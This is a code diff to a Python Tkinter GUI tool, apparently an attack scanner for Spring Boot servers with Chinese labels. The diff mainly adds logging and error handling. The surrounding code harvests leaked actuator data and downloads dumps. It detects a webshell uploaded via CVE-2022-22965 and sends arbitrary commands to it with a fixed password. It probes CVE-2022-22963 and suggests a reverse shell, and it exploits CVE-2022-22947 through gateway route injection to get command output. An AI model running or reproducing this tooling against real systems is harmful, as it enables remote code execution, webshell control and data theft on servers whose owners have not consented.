@@ -1,14 +1,11 @@
 #!/usr/bin/env python
 # coding=utf-8
-import requests, sys, json, re, os, random, shutil
-import urllib3
+import webbrowser, sys, json, re, os, random, shutil
+import urllib3, requests
 import tkinter as tk
-import webbrowser
-from time import sleep
 from threading import Thread
-from tkinter import ttk
-from tkinter import filedialog
-from tkinter import messagebox
+from time import sleep, strftime, localtime
+from tkinter import messagebox, filedialog, ttk
 from tkinter.filedialog import askdirectory
 
 class RootFrom:
@@ -84,9 +81,6 @@ class RootFrom:
         self.info_dict = tk.Entry(self.root,state='disable')
         self.info_dict.place(x=150,y=180)
         # 泄露下载
-        #self.var_download = tk.StringVar(self.root)
-        #self.download = ttk.Checkbutton(self.root,text="执行下载",variable=self.var_download,onvalue="执行下载",offvalue="不执行下载")
-        #self.download.place(x=150,y=210)
         self.download = tk.Entry(self.root,state='disable')
         self.download.place(x=150,y=210)
         # 漏洞利用控件
@@ -119,6 +113,10 @@ class RootFrom:
         self.info_text.place(x=350,y=0)
         self.vbar.config(command=self.info_text.yview)
         self.vbar.pack(side=tk.RIGHT, fill="y")
+        # 日志功能
+        self.log_var = tk.StringVar(self.root)
+        self.log = ttk.Checkbutton(self.root,text="日志功能",variable=self.log_var,onvalue="启用",offvalue="不启用")
+        self.log.place(x=255,y=5)
         #菜单容器创建
         menu = tk.Menu(self.root)
         #创建菜单
@@ -139,6 +137,7 @@ class RootFrom:
         dir_clear.add_command(label='泄露下载',command=self.clear_dir5)
         dir_clear.add_command(label='漏洞地址',command=self.clear_dir4)
         dir_clear.add_command(label='ALL清除',command=self.clear_dirs)
+        menu_info.add_cascade(label='日志清除',command=self.clearlog)
         menu_info.add_cascade(label='全局清除',command=self.clear)
         menu_get = tk.Menu(menu,tearoff=0)
         menu.add_cascade(label='更多',menu=menu_get)
@@ -201,7 +200,7 @@ class RootFrom:
             self.ranks.insert('insert',path)
             self.ranks.config(state='disable')
     def Openfiledir5(self):
-        filetypes=[('output.txt','output.txt'),('.txt','*.txt'),('xlsx','*.xlsx'),('all','*.*')]
+        filetypes=[('urlout.txt','urlout.txt'),('.txt','*.txt'),('xlsx','*.xlsx'),('all','*.*')]
         path = filedialog.askopenfilename(title='文件选择',filetypes=filetypes)
         self.download.config(state='normal')
         if path == '':
@@ -265,6 +264,15 @@ class RootFrom:
         self.download.config(state='normal')
         self.download.delete(0,'end')
         self.download.config(state='disable')
+    def clearlog(self):
+        if os.path.exists("scanLogs.log"):
+            os.remove("scanLogs.log")
+        if os.path.exists("downloadLogs.log"):
+            os.remove("downloadLogs.log")
+        if os.path.exists("vuleLogs.log"):
+            os.remove("vuleLogs.log")
+        if os.path.exists("vuleExecLogs.log"):
+            os.remove("vuleExecLogs.log")
     def uas(self):
         if self.User_Agent.get() == "Random":
             ua_nums = len(user_agent) - 1
@@ -392,26 +400,36 @@ class RootFrom:
                             r = requests.get(url=u, headers=header, timeout=6, verify=False)  # 设置超时6秒
                         if r.status_code == 503:
                             pass
+                        elif r.status_code == 200:
+                            back = "[+] 状态码%d" % r.status_code + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(r.content))
+                            self.info_text.insert(tk.INSERT,back)
+                            self.info_text.insert(tk.INSERT, '\n')
+                            f = open("urlout.txt", "a")
+                            f.write(u + '\n')
+                            f.close()
+                        else:
+                            back = "[-] 状态码%d" % r.status_code + ' ' + "无法访问URL为:" + u
+                            self.info_text.insert(tk.INSERT,back)
+                            self.info_text.insert(tk.INSERT, '\n')
                     except:
-                        self.info_text.insert(tk.INSERT,"[-] URL为 " + u + " 的目标积极拒绝请求，予以跳过！")
+                        back = "[-] URL为 " + u + " 的目标积极拒绝请求，予以跳过！"
+                        self.info_text.insert(tk.INSERT,back)
                         self.info_text.insert(tk.INSERT, '\n')
                         break
-                    if r.status_code == 200:
-                        back = "[+] 状态码%d" % r.status_code + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(r.content))
-                        self.info_text.insert(tk.INSERT,back)
-                        self.info_text.insert(tk.INSERT, '\n')
-                        f = open("urlout.txt", "a")
-                        f.write(u + '\n')
-                        f.close()
-                    else:
-                        back = "[-] 状态码%d" % r.status_code + ' ' + "无法访问URL为:" + u
-                        self.info_text.insert(tk.INSERT,back)
-                        self.info_text.insert(tk.INSERT, '\n')
+                    if self.log_var.get() == "启用":
+                        with open("scanLogs.log","a") as f:
+                            f.write(back + ' ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                            f.write("\n")
             count = len(open("urlout.txt", 'r').readlines())
             if count >= 1:
                 back = "[+][+][→] 发现目标URL存在SpringBoot敏感信息泄露，已经导出至 urlout.txt ，共%d行记录" % count
                 self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
+            #time = strftime("%Y-%m-%d %H:%M:%S",localtime())
+            if self.log_var.get() == "启用":
+                with open("scanLogs.log","a") as f:
+                    f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                    f.write("\n")
         else:
             messagebox.showinfo("提示","字典路径不能为空！")
     def Downloads(self,url,name,proxies):
@@ -421,23 +439,36 @@ class RootFrom:
         dumpdir = os.path.join(pwd,"dump")
         requests.packages.urllib3.disable_warnings()
         try:
+            back = "[+]执行下载中"
+            self.info_text.insert(tk.INSERT,back)
+            self.info_text.insert(tk.INSERT, '\n')
             if proxies != "":
                 r = requests.get(url, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
             else:
                 r = requests.get(url, timeout=6, verify=False)  # 设置超时6秒
-            back = "[+]执行下载中"
-            self.info_text.insert(tk.INSERT,back)
-            self.info_text.insert(tk.INSERT, '\n')
-            with open('{}'.format(name),'wb') as f:
-                f.write(r.content)
-            filedir = os.path.join(pwd,name)
-            shutil.move(filedir,dumpdir)
-            back = "[+]下载完成 {}".format(name)
-            self.info_text.insert(tk.INSERT,back)
-            self.info_text.insert(tk.INSERT, '\n')
+            if r.status_code == 200:
+                with open('{}'.format(name),'wb') as f:
+                    f.write(r.content)
+                filedir = os.path.join(pwd,name)
+                dstfile = os.path.join(dumpdir,name)
+                if os.path.exists(dstfile):
+                    os.remove(dstfile)
+                shutil.move(filedir,dumpdir)
+                if os.path.exists(name):
+                    os.remove(name)
+                back = "[+]下载完成 {}".format(name)
+                self.info_text.insert(tk.INSERT,back)
+                self.info_text.insert(tk.INSERT, '\n')
+            else:
+                pass
         except:
-            self.info_text.insert(tk.INSERT,"[-] URL为 " + url + " 连接失败！")
+            back = "[-] URL为 " + url + " 连接失败！"
+            self.info_text.insert(tk.INSERT,back)
             self.info_text.insert(tk.INSERT, '\n')
+        if self.log_var.get() == "启用":
+            with open("downloadLogs.log","a") as f:
+                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                f.write("\n")
     def DumpInfo(self):
         input_urlfile = self.download.get()
         url_proxy = self.url_proxy_get("www.baidu.com")
@@ -462,8 +493,15 @@ class RootFrom:
                 if "：" in name:
                     name.replace('：',"-")
                 self.Downloads(i,name,proxies)
-        self.info_text.insert(tk.INSERT,"[+]ALL下载完成")
+                if os.path.exists(name):
+                    os.remove(name)
+        back = "[+]ALL下载完成"
+        self.info_text.insert(tk.INSERT,back)
         self.info_text.insert(tk.INSERT, '\n')
+        if self.log_var.get() == "启用":
+            with open("downloadLogs.log","a") as f:
+                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                f.write("\n")
     def dumpinfo(self):
         try:
             threadDumpInfo = Thread(target=self.DumpInfo)
@@ -489,8 +527,13 @@ class RootFrom:
         else:
             url = url.strip("\n")
             self.info_check(url, proxies, ua)
-        self.info_text.insert(tk.INSERT,"[+]泄露扫描完成")
+        back = "[+]泄露扫描完成"
+        self.info_text.insert(tk.INSERT,back)
         self.info_text.insert(tk.INSERT, '\n')
+        if self.log_var.get() == "启用":
+            with open("scanLogs.log","a") as f:
+                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                f.write("\n")
     def scan(self):
         try:
             threadScan = Thread(target=self.Scan)
@@ -505,6 +548,10 @@ class RootFrom:
         tar = '[+]target ' + url
         self.info_text.insert(tk.INSERT,tar)
         self.info_text.insert(tk.INSERT, '\n')
+        if self.log_var.get() == "启用":
+            with open("vuleLogs.log","a") as f:
+                f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                f.write("\n")
         Headers_1 = {
             "User-Agent": ua,
             "suffix": "%>//",
@@ -537,29 +584,56 @@ class RootFrom:
                 sleep(1)
             test = requests.get(url + "tomcatwar.jsp")
             if (test.status_code == 200) and ('aabysszg' in str(test.text)):
-                self.info_text.insert(tk.INSERT,"[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami")
+                back = "[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami"
+                self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
             else:
-                self.info_text.insert(tk.INSERT,"[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址自行扫描")
+                back = "[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址自行扫描"
+                self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
         except Exception as e:
-             self.info_text.insert(tk.INSERT,e)
-             self.info_text.insert(tk.INSERT, '\n')
+            back = str(e)
+            self.info_text.insert(tk.INSERT,back)
+            self.info_text.insert(tk.INSERT, '\n')
+        if self.log_var.get() == "启用":
+            with open("vuleLogs.log","a") as f:
+                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                f.write("\n")
     def CVE_2022_22965_Exec(self):
         url = self.rank.get()
         if url != "":
             title = "================CVE_2022_2296命令执行================"
             self.info_text.insert(tk.INSERT,title)
             self.info_text.insert(tk.INSERT, '\n')
+            tar = '[+]target ' + url
+            self.info_text.insert(tk.INSERT,tar)
+            self.info_text.insert(tk.INSERT, '\n')
+            if self.log_var.get() == "启用":
+                with open("vuleExecLogs.log","a") as f:
+                    f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()) + " start")
+                    f.write("\n")
             if url[-1] != '/':
                 url += '/'
             cmd = self.reverse_tcp.get()
             url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
-            r = requests.get(url_shell)
-            resp = r.text
-            result = re.findall('([^\x00]+)\n', resp)#[0]
-            self.info_text.insert(tk.INSERT,result)
+            try:
+                r = requests.get(url_shell)
+                resp = r.text
+                result = re.findall('([^\x00]+)\n', resp)#[0]
+            except urllib3.util.ssl_match_hostname.CertificateError:
+                result = "[-] CVE_2022_2296命令执行 请求错误"
+            except urllib3.exceptions.MaxRetryError:
+                result = "[-] CVE_2022_2296命令执行 请求错误"
+            except requests.exceptions.SSLError:
+                result = "[-] CVE_2022_2296命令执行 请求错误"
+            except:
+                result = "[-] CVE_2022_2296命令执行 未知错误"
+            self.info_text.insert(tk.INSERT,str(result))
             self.info_text.insert(tk.INSERT, '\n')
+            if self.log_var.get() == "启用":
+                with open("vuleExecLogs.log","a") as f:
+                    f.write(str(result) + '   ' + str(strftime("%Y-%m-%d %H:%M:%S",localtime())) + " end")
+                    f.write("\n")
         else:
             messagebox.showinfo("提示","存在漏洞地址不能为空！")
     def CVE_2022_22963(self, url, proxies):
@@ -591,14 +665,29 @@ class RootFrom:
             rsp = '"error":"Internal Server Error"'
 
             if code == 500 and rsp in text:
-                self.info_text.insert(tk.INSERT,f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹shell')
+                back = f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹shell'
+                self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
             else:
-                self.info_text.insert(tk.INSERT,"[-] CVE-2022-22963漏洞不存在")
+                back = "[-] CVE-2022-22963漏洞不存在"
+                self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
         except requests.exceptions.ConnectionError:
-            self.info_text.insert(tk.INSERT,"[-] 你的主机中的软件中止了一个已建立的连接")
+            back = "[-] CVE-2022-22963 无法连接,你的主机中的软件中止了一个已建立的连接"
+            self.info_text.insert(tk.INSERT,back)
             self.info_text.insert(tk.INSERT, '\n')
+        except requests.exceptions.ReadTimeout:
+            back = "[-] CVE-2022-22963 请求超时,你的主机中的软件中止了一个已建立的连接"
+            self.info_text.insert(tk.INSERT,back)
+            self.info_text.insert(tk.INSERT, '\n')
+        except requests.exceptions.TooManyRedirects:
+            back = "[-] CVE-2022-22963 过多的重定向,你的主机中的软件中止了一个已建立的连接"
+            self.info_text.insert(tk.INSERT,back)
+            self.info_text.insert(tk.INSERT, '\n')
+        if self.log_var.get() == "启用":
+            with open("vuleLogs.log","a") as f:
+                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                f.write("\n")
     def CVE_2022_22947(self, url, proxies):
         title = "================开始对目标URL进行CVE-2022-22947漏洞利用================"
         self.info_text.insert(tk.INSERT,title)
@@ -641,16 +730,29 @@ class RootFrom:
                 re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
                 re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
             if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
-                self.info_text.insert(tk.INSERT,"[+] Payload已经输出，回显结果如下：")
-                self.info_text.insert(tk.INSERT, '\n')
-                self.info_text.insert(tk.INSERT,re3.text)
+                back = "[+] Payload已经输出，回显结果如下：" + '\n' + re3.text + '[END]'
+                self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
             else:
-                self.info_text.insert(tk.INSERT,"[-] CVE-2022-22947漏洞不存在")
+                back = "[-] CVE-2022-22947漏洞不存在"
+                self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
         except requests.exceptions.ConnectionError:
-            self.info_text.insert(tk.INSERT,"[-] 你的主机中的软件中止了一个已建立的连接")
+            back = "[-] CVE-2022-22947 无法连接,你的主机中的软件中止了一个已建立的连接"
+            self.info_text.insert(tk.INSERT,back)
             self.info_text.insert(tk.INSERT, '\n')
+        except requests.exceptions.ReadTimeout:
+            back = "[-] CVE-2022-22947 请求超时,你的主机中的软件中止了一个已建立的连接"
+            self.info_text.insert(tk.INSERT,back)
+            self.info_text.insert(tk.INSERT, '\n')
+        except requests.exceptions.TooManyRedirects:
+            back = "[-] CVE-2022-22947 过多的重定向,你的主机中的软件中止了一个已建立的连接"
+            self.info_text.insert(tk.INSERT,back)
+            self.info_text.insert(tk.INSERT, '\n')
+        if self.log_var.get() == "启用":
+            with open("vuleLogs.log","a") as f:
+                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                f.write("\n")
     def Vule(self):
         Vule = self.CVEs.get()
         input_url = self.rank_check()
@@ -687,8 +789,13 @@ class RootFrom:
                 self.CVE_2022_22963(url, proxies)
             elif Vule == "CVE-2022-22947":
                 self.CVE_2022_22947(url, proxies)
-        self.info_text.insert(tk.INSERT,"[+]漏洞扫描完成")
+        back = "[+]漏洞扫描完成"
+        self.info_text.insert(tk.INSERT,back)
         self.info_text.insert(tk.INSERT, '\n')
+        if self.log_var.get() == "启用":
+            with open("vuleLogs.log","a") as f:
+                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                f.write("\n")
     def vule(self):
         try:
             threadVule = Thread(target=self.Vule)
